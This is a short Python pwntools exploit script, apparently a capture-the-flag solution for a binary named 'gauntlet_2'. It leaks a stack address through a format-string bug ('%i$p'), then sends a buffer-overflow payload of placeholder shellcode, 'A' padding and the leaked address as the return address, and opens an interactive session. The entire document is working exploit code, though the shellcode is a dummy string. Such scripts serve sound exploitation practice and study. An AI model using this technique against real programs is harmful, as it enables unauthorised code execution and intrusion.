# Credit to ZeroDay Tea
from pwn import *
import sys
context.arch = 'amd64'

context.log_level = "critical"
for i in range(0, 20):
    r = gdb.debug('./gauntlet_2')
    r.sendline('%{}$p'.format(i))
    leak = r.recvline(keepends=False).decode()
    try:
        address = int(leak, 16) - 16
        if(address >= 0):
            print("testing: i = {} | address: {}".format(i, hex(address)))
            shellcode = b'ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ'
            offset = b'A'*(120-len(shellcode))
            payload = shellcode + offset + p64(address)
            r.sendline(payload)
            r.interactive()
        else:
            print("value too low: skipped")
    except:
        print("cannot convert: skipped")
